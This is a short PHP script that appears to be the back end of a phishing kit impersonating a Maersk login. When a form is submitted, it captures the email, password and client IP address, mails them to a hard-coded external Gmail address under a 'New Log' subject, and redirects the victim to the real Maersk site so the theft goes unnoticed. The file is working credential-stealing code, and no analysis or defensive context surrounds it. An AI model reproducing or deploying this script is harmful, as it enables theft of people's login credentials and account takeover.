<?
                                                                                                                                                              
if(isset($_POST['save']))
          
{
                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created Xeuztech-----------\n";
$send = "barrymark447@gmail.com";
$subject = "--New Log $ip -- Source:(New Upgrade)";


mail($send,$subject,$message,$headers);


$redirect = "https://www.maersk.com";

header("Location: " .$redirect);
 }
?>